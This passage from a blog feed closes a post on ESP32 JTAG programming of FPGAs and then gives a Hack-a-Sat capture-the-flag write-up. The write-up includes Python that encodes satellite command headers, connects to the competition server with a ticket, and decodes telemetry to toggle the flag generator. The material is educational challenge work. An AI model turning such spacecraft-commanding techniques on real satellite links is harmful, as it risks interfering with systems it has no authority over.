        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Client disconnected"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So yesterday someone sent me a link that was not related to that, but I found this lib:
<a href="http://www.clifford.at/libxsvf/"><strong>Lib(X)SVF - A library for implementing SVF and XSVF JTAG players</strong>
<em>JTAG (IEEE 1149.1, aka “Boundary Scan”) is a standard IC testing, debugging and programming port. SVF (Serial Vector…</em>www.clifford.at</a></p>

<p>Basically it was written by the same person that did the reverse engineer for ICE40 FPGA Bitstream (and several others) and make a nice lib to “play” the SVF and XSVF files. It was pretty straightforward to implement a programmer using the ESP32. Basically you only had to implement a few functions and the player would work.</p>

<p>I went through a lot of work to make it nice to use, so I will not explain in details here. But the source code is available here: <a href="https://github.com/racerxdl/esp32-rjtag">https://github.com/racerxdl/esp32-rjtag</a></p>

<p>Basically you can run:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload.py /dev/ttyUSB0 file.svf
</code></pre></div></div>

<p>And it will write the FPGA for you. Here is a video of working:</p>

<center>
  <blockquote class="twitter-tweet"><p lang="en" dir="ltr">FINALLY. Now I can use the ESP32 as JTAG programmer for Lattice FPGA. Soon I will able to program through wifi and pipe a serial debug port as well. <a href="https://t.co/zs41v47BvU">pic.twitter.com/zs41v47BvU</a></p>&mdash; Cybernetic Lover (@lucasteske) <a href="https://twitter.com/lucasteske/status/1272019368617095173?ref_src=twsrc%5Etfw">June 14, 2020</a></blockquote> <script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</center>

<p>I also added a simple command to switch the ESP32 from programming mode to Serial Passthrough. This way, after programming it can pipe all FPGA Serial Calls to the ESP32 serial. Then I did this small Serial Hello World for testing it:
<a href="https://github.com/racerxdl/fpga-serial-hello"><strong>racerxdl/fpga-serial-hello</strong></a></p>

<p>Which basically keeps sending Hello World through the serial port forever. And it does work!</p>

<p><img src="/assets/posts/medium/1_Z8RdW5i7NQh7KUEC5v5NFg.png" alt="Hello World output from FPGA" /><em>Hello World output from FPGA</em></p>

<p>My next steps is to make this work through network instead of serial port. Which would be really amazing!</p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="FPGA" /><category term="ESP32" /><category term="Hacking" /><category term="FPGA" /><category term="ICEWolf" /><category term="IceStick" /><category term="ECP5" /><category term="Lattice" /><category term="ESP32" /><category term="Colorlight" /><summary type="html"><![CDATA[Hacking a ESP32 into FPGA Board]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_ALnLx9L06FSciqeEV5OCuQ.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_ALnLx9L06FSciqeEV5OCuQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Talk to me, Goose</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goose/" rel="alternate" type="text/html" title="Hack a Sat - Talk to me, Goose" /><published>2020-05-31T19:02:00-03:00</published><updated>2020-05-31T19:02:00-03:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goos</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goose/"><![CDATA[<h1 id="hack-a-sattalk-to-me-goose">Hack a Sat — Talk to me, Goose</h1>

<p>The “Talk to me, Goose challenge” on Hackasat</p>

<p>This challenge is just after the “Can you hear me now?” challenge (see <a href="/2020/05/hack-a-sat-can-you-hear-me-now/">Hack a Sat - Can you hear me now?</a> ). Now LaunchDotCom has a new Satellite called Carnac 2.0.</p>

<p>There are two attached files. The first one is the manual of the satellite in which we can see the onboard equipment:</p>

<p><img src="/assets/posts/medium/1_Yn5BggzZddP21yFopKx9PA.png" alt="System Diagram of Carnac 2.0 Satellite" /><em>System Diagram of Carnac 2.0 Satellite</em></p>

<p>There is also a XTCE file in which the Telemetry Data looks the same as previous challenge, but now there is a Command Section which implies that we will need to send commands back to the satellite. If we connect to the telemetry server and run the bonus script form the previous challenge, we will see that is only transmitting EPS</p>

<p><img src="/assets/posts/medium/1_QGRnvC2S4sj_gM_8HHvXGQ.png" alt="EPS Telemetry Data" /><em>EPS Telemetry Data</em></p>

<p>Also you can see that most of the equipments are off. The one that interest us is the FLAG_ENABLE which enables the FLAG Generator equipment to output our flag.</p>

<p>So I went directly to the XTCE to find a Enable Flag command that would toggle that. I found this section:</p>

<p><img src="/assets/posts/medium/1_GgD477ihhBIjwsjG9yQReQ.png" alt="EnableFLAG command" /><em>EnableFLAG command</em></p>

<p>The logic is the same as applied for the previous flag, but now instead is for encoding a command and sending back to the satellite. We can assume we can send data back using the same connection we opened to the telemetry server. So I first created a encoder for the header:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">enableflag</span> <span class="o">=</span> <span class="p">{</span>
  <span class="s">"c_version"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="s">"c_type"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
  <span class="s">"c_sechd"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="s">"c_gpflags"</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
  <span class="s">"c_apid"</span><span class="p">:</span> <span class="mi">103</span><span class="p">,</span>
  <span class="s">"c_ssc"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="s">"c_plen"</span><span class="p">:</span> <span class="mi">2</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">EncodeHeader</span><span class="p">():</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_version"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_type"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_sechd"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_apid"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="s">"c_apid"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_gpflags"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_gpflags"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="s">"c_ssc"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_plen"</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_plen"</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="k">return</span> <span class="n">data</span>

</code></pre></div></div>

<p>Then the missing data would be 3 bytes:</p>

<ul>
  <li>CMD =&gt; Which tells the command to execute</li>
  <li>PARAM =&gt; The command parameter</li>
  <li>PowerState =&gt; To enable the power</li>
</ul>

<p>Since we would need to send data back, I decided to use the pwntools library ( see <a href="http://docs.pwntools.com/en/stable/">http://docs.pwntools.com/en/stable/</a> ) and make a realtime decoder for the telemetry.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">struct</span><span class="p">,</span> <span class="n">binascii</span>

<span class="kn">from</span> <span class="nn">pprint</span> <span class="kn">import</span> <span class="n">pprint</span>


<span class="n">APID_FLAG_PACKET</span> <span class="o">=</span> <span class="mi">102</span>
<span class="n">APID_EPS_PACKET</span> <span class="o">=</span> <span class="mi">103</span>
<span class="n">APID_PAYLOAD_PACKET</span> <span class="o">=</span> <span class="mi">105</span>

<span class="n">enableflag</span> <span class="o">=</span> <span class="p">{</span>
  <span class="s">"c_version"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="s">"c_type"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
  <span class="s">"c_sechd"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="s">"c_gpflags"</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
  <span class="s">"c_apid"</span><span class="p">:</span> <span class="mi">103</span><span class="p">,</span>
  <span class="s">"c_ssc"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="s">"c_plen"</span><span class="p">:</span> <span class="mi">2</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">EncodeHeader</span><span class="p">():</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_version"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_type"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_sechd"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_apid"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="s">"c_apid"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_gpflags"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_gpflags"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="s">"c_ssc"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_plen"</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_plen"</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="k">return</span> <span class="n">data</span>

<span class="k">def</span> <span class="nf">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">c_version</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xE0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span>
  <span class="n">c_type</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
  <span class="n">c_sechd</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span>
  <span class="n">c_apid</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  <span class="n">c_gpflags</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xC0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span>
  <span class="n">c_ssc</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
  <span class="n">c_plen</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span>
  <span class="k">return</span> <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span>

<span class="k">def</span> <span class="nf">DecodeFlag</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">bitstream</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">format</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">"08b"</span><span class="p">):</span>
      <span class="n">bitstream</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>

  <span class="n">flagdata</span> <span class="o">=</span> <span class="s">""</span>

  <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">b</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
      <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">i</span><span class="p">:</span>
        <span class="n">b</span> <span class="o">+=</span> <span class="n">bitstream</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">b</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
      <span class="n">flagdata</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
    <span class="n">bitstream</span> <span class="o">=</span> <span class="n">bitstream</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>

  <span class="k">return</span> <span class="n">flagdata</span>

<span class="k">def</span> <span class="nf">DecodeEPS</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">battemp</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
  <span class="n">voltage</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">"&gt;H"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">low_pwr_thresh</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">"&gt;H"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>

  <span class="n">LOW_PWR_MODE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">BATT_HTR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">PAYLOAD_PWR</span>   <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">FLAG_PWR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">ADCS_PWR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO1_PWR</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO2_PWR</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>

  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>

  <span class="n">PAYLOAD_ENABLE</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">FLAG_ENABLE</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">ADCS_ENABLE</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO1_ENABLE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO2_ENABLE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>

  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
  <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
  <span class="n">BAD_CMD_COUNT</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">"&gt;I"</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

  <span class="k">return</span> <span class="p">{</span>
    <span class="s">"low_pwr_thresh"</span><span class="p">:</span> <span class="n">low_pwr_thresh</span><span class="p">,</span>
    <span class="s">"voltage"</span><span class="p">:</span> <span class="n">voltage</span><span class="p">,</span>
    <span class="s">"LOW_PWR_MODE"</span><span class="p">:</span> <span class="n">LOW_PWR_MODE</span><span class="p">,</span>
    <span class="s">"BATT_HTR"</span><span class="p">:</span> <span class="n">BATT_HTR</span><span class="p">,</span>
    <span class="s">"PAYLOAD_PWR"</span><span class="p">:</span> <span class="n">PAYLOAD_PWR</span><span class="p">,</span>
    <span class="s">"FLAG_PWR"</span><span class="p">:</span> <span class="n">FLAG_PWR</span><span class="p">,</span>
    <span class="s">"ADCS_PWR"</span><span class="p">:</span> <span class="n">ADCS_PWR</span><span class="p">,</span>
    <span class="s">"RADIO1_PWR"</span><span class="p">:</span> <span class="n">RADIO1_PWR</span><span class="p">,</span>
    <span class="s">"RADIO2_PWR"</span><span class="p">:</span> <span class="n">RADIO2_PWR</span><span class="p">,</span>
    <span class="s">"PAYLOAD_ENABLE"</span><span class="p">:</span> <span class="n">PAYLOAD_ENABLE</span><span class="p">,</span>
    <span class="s">"FLAG_ENABLE"</span><span class="p">:</span> <span class="n">FLAG_ENABLE</span><span class="p">,</span>
    <span class="s">"ADCS_ENABLE"</span><span class="p">:</span> <span class="n">ADCS_ENABLE</span><span class="p">,</span>
    <span class="s">"RADIO1_ENABLE"</span><span class="p">:</span> <span class="n">RADIO1_ENABLE</span><span class="p">,</span>
    <span class="s">"RADIO2_ENABLE"</span><span class="p">:</span> <span class="n">RADIO2_ENABLE</span><span class="p">,</span>
    <span class="s">"BAD_CMD_COUNT"</span><span class="p">:</span> <span class="n">BAD_CMD_COUNT</span><span class="p">,</span>
  <span class="p">}</span>


<span class="n">rv</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"goose.satellitesabove.me"</span><span class="p">,</span> <span class="mi">5033</span><span class="p">)</span>
<span class="n">rv</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Ticket please:"</span><span class="p">)</span>
<span class="n">rv</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"ticket{delta76170foxtrot:GCOmAUq4Fz8K0PQ1qFpviGNJXkI0FmI2eIDZ9BB2EvbrZwD0EoKIt0af4wyrI0W7QA}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">v</span> <span class="o">=</span> <span class="n">rv</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Telemetry Service running at "</span><span class="p">)</span>
<span class="n">v</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">rv</span><span class="p">.</span><span class="n">recv</span><span class="p">(),</span> <span class="n">encoding</span><span class="o">=</span><span class="s">"utf8"</span><span class="p">)</span>

<span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">v</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Connecting %s:%d"</span> <span class="o">%</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>

<span class="n">s</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Received %d bytes"</span> <span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

    <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span> <span class="o">=</span> <span class="n">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>
    <span class="k">if</span> <span class="n">c_apid</span> <span class="o">==</span> <span class="n">APID_FLAG_PACKET</span><span class="p">:</span>
      <span class="n">flag</span> <span class="o">=</span> <span class="n">DecodeFlag</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"THE FLAG: %s"</span> <span class="o">%</span> <span class="n">flag</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">c_apid</span> <span class="o">==</span> <span class="n">APID_EPS_PACKET</span><span class="p">:</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"EPS: "</span><span class="p">)</span>
      <span class="n">eps</span> <span class="o">=</span> <span class="n">DecodeEPS</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="n">pprint</span><span class="p">(</span><span class="n">eps</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"GOT PACKET %d with LENGTH %d"</span> <span class="o">%</span><span class="p">(</span><span class="n">c_apid</span><span class="p">,</span> <span class="n">c_plen</span><span class="p">))</span>
      <span class="k">print</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"ERROR: "</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
    <span class="k">break</span>

<span class="n">rv</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

